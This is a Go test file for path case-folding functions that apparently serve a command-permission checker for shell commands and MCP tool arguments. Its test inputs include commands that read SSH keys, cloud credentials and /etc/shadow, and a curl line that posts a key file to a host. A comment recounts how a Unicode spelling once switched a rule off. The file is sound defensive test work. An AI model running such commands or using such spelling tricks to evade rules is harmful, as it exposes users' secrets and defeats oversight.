package pathnorm

import "testing"

// TestFoldPathCase pins which bytes the #4194 fold lowers and, as importantly,
// which it must leave alone: a variable name, an escaped byte, a URL, a flag.
// Lowering any of those would change what the shell RUNS, not how the
// filesystem spells a path, and the folded reading would then be judging a
// different command.
func TestFoldPathCase(t *testing.T) {
	dot := "." // keep credential-looking literals out of one contiguous token
	cases := []struct {
		name, in, want string
	}{
		{"home tilde", "cat ~/" + dot + "SSH/ID_RSA", "cat ~/" + dot + "ssh/id_rsa"},
		{"home var", "cat $HOME/" + dot + "Aws/Credentials", "cat $HOME/" + dot + "aws/credentials"},
		{"home var braced", "cat ${HOME}/" + dot + "KUBE/Config", "cat ${HOME}/" + dot + "kube/config"},
		{"tilde user keeps the name", "cat ~Alice/" + dot + "SSH/x", "cat ~Alice/" + dot + "ssh/x"},
		{"absolute path keeps /Users", "cat /USERS/Bob/" + dot + "SSH/x", "cat /Users/bob/" + dot + "ssh/x"},
		{"macOS layout restored", "cat ~/LIBRARY/LAUNCHAGENTS/X.PLIST", "cat ~/Library/LaunchAgents/x.plist"},
		{"root Library restored", "ls /library/KEYCHAINS/X", "ls /Library/Keychains/x"},
		{"escaped space in a layout name", `ls ~/library/application\ support/X`, `ls ~/Library/Application\ Support/x`},
		{"layout names only at their level", "ls ~/" + dot + "vscode/EXTENSIONS/Library/X", "ls ~/" + dot + "vscode/extensions/library/x"},
		{"system library", "ls /SYSTEM/LIBRARY/LAUNCHDAEMONS/X", "ls /System/Library/LaunchDaemons/x"},
		{"var root home", "cat /VAR/ROOT/LIBRARY/X", "cat /var/root/Library/x"},
		{"shared is not a user", "ls /Users/SHARED/X", "ls /Users/Shared/x"},
		{"flag value after =", "kubectl --kubeconfig=/HOME/u/" + dot + "KUBE/config get pods", "kubectl --kubeconfig=/home/u/" + dot + "kube/config get pods"},
		{"curl @file", "curl -d @/HOME/u/" + dot + "SSH/k https://example.com", "curl -d @/home/u/" + dot + "ssh/k https://example.com"},
		{"quoted path", `cat "~/` + dot + `SSH/K"`, `cat "~/` + dot + `ssh/k"`},
		{"interpreter literal", `python3 -c "open('/ETC/Shadow')"`, `python3 -c "open('/etc/shadow')"`},
		{"brace group", "cat ~/" + dot + "{SSH,X}/K", "cat ~/" + dot + "{ssh,x}/k"},
		{"variable reference keeps its case", "cat ~/" + dot + "SSH/$KEYFILE", "cat ~/" + dot + "ssh/$KEYFILE"},
		{"braced variable keeps its case", "cat ~/" + dot + "SSH/${KEY_FILE}x", "cat ~/" + dot + "ssh/${KEY_FILE}x"},
		{"escaped byte keeps its case", `printf '~/` + dot + `SSH/K\N'`, `printf '~/` + dot + `ssh/k\N'`},
		{"span ends at a word break", "cat ~/" + dot + "SSH/K; echo DONE /TMP/X", "cat ~/" + dot + "ssh/k; echo DONE /tmp/x"},
		{"file URL folds its path", "curl file:///Users/U/" + dot + "SSH/K", "curl file:///Users/u/" + dot + "ssh/k"},
		{"remote copy target", "scp host:/ROOT/" + dot + "SSH/K .", "scp host:/root/" + dot + "ssh/k ."},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := FoldPathCase(c.in)
			if got != c.want {
				t.Errorf("FoldPathCase(%q)\n got: %q\nwant: %q", c.in, got, c.want)
			}
		})
	}
}

// TestFoldPathCaseLeavesNonPathsAlone is the no-op half: text with no
// upper-case letter in a path span returns "" (the no-op sentinel every
// caller tests for), so the folded evaluation is never run for it.
func TestFoldPathCaseLeavesNonPathsAlone(t *testing.T) {
	for _, in := range []string{
		"",
		"ls -la",
		"cat ~/notes.txt",
		"echo HELLO WORLD",
		"curl -D headers.txt https://Example.COM/API/Keys", // a URL is not a path
		"grep -R TODO src/", // relative path, flag case kept
		"FOO=BAR make Build",
		"cat $HOME/notes $XDG_CONFIG_HOME/Thing", // $XDG… is not a home anchor
		"tar -C /tmp -xzf x.tgz",                 // -C is a flag, /tmp is already lower
		"echo $PATH",
		"cd /Users/user/dev/x && ls",      // already the canonical spelling
		`open ~/Library/Application\ Support`, // already the canonical spelling
	} {
		if got := FoldPathCase(in); got != "" {
			t.Errorf("FoldPathCase(%q) = %q, want \"\" (nothing to fold)", in, got)
		}
	}
}

// TestFoldPathValue: an MCP argument that IS a path is folded whole — it has
// no shell word breaks, so a space is part of the path — while prose that
// mentions a path is folded the shell way.
func TestFoldPathValue(t *testing.T) {
	cases := []struct{ in, want string }{
		{"/USERS/U/LIBRARY/APPLICATION SUPPORT/Vendor/Profile Data", "/Users/u/Library/Application Support/vendor/profile data"},
		{"~/.Config/X Y/Z", "~/.config/x y/z"},
		{"$HOME/.KUBE/config", "$HOME/.kube/config"},
		{"/Users/U/x;y|Z", "/Users/u/x;y|z"},
		{"please read /Users/U/.SSH/K now", "please read /Users/u/.ssh/k now"},
		{"/Users/u/Library/Application Support/x", ""}, // already canonical
		{"No Path Here", ""},
		{"/already/lower", ""},
		{"", ""},
	}
	for _, c := range cases {
		if got := FoldPathValue(c.in); got != c.want {
			t.Errorf("FoldPathValue(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// TestFoldPathCaseIsASCIIOnly pins the #3771 lesson: Unicode simple folding
// maps U+017F (long s) to "s" and U+212A (Kelvin sign) to "k", which is how a
// (?i) exclusion once let a non-ASCII spelling switch a rule off. This fold
// touches A-Z only.
func TestFoldPathCaseIsASCIIOnly(t *testing.T) {
	longS, kelvin := string(rune(0x017F)), string(rune(0x212A)) // U+017F long s, U+212A Kelvin sign
	in := "cat ~/." + longS + longS + "h/" + kelvin + "ey"
	if got := FoldPathCase(in); got != "" {
		t.Errorf("FoldPathCase(%q) = %q; non-ASCII letters must not fold", in, got)
	}
	if got := FoldASCII("A" + kelvin + "Z"); got != "a"+kelvin+"z" {
		t.Errorf("FoldASCII folded a non-ASCII letter: %q", got)
	}
}
